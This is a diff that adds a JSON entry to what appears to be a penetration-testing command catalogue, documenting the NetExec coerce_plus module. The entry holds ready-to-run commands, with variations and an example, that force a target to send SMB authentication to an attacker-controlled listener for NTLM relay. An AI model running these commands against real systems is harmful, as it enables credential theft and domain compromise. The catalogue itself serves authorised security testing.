@@ -1,0 +1,20 @@
+{
+  "id": "nxc-coerce-plus",
+  "name": "NetExec coerce_plus Module",
+  "command": "nxc smb <target> -u '<user>' -p '<password>' -M coerce_plus -o LISTENER=<attacker-ip>",
+  "description": "Unified coercion module — replaces the individual petitpotam/printerbug/dfscoerce/shadowcoerce/mserven modules. Tries every known coercion method (or one selected via METHOD) and triggers SMB authentication back to your listener. The recommended entry point in NetExec v1.4+ for any coerce-then-relay chain.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["smb", "rpc"],
+  "tags": ["netexec", "nxc", "coerce_plus", "petitpotam", "printerbug", "dfscoerce", "ntlm-relay"],
+  "variations": [
+    { "label": "Specific Method", "requires": "password", "command": "nxc smb <target> -u '<user>' -p '<password>' -M coerce_plus -o LISTENER=<attacker-ip> METHOD=dfscoerce" },
+    { "label": "Continue On Failure", "requires": "password", "command": "nxc smb <target> -u '<user>' -p '<password>' -M coerce_plus -o LISTENER=<attacker-ip> ALWAYS_CONTINUE=true" }
+  ],
+  "references": [
+    { "title": "NetExec coerce_plus", "url": "https://www.netexec.wiki/smb-protocol/coerce_plus" }
+  ],
+  "examples": [
+    "nxc smb 10.10.10.20 -u jdoe -p 'Password123!' -M coerce_plus -o LISTENER=10.10.14.5"
+  ]
+}
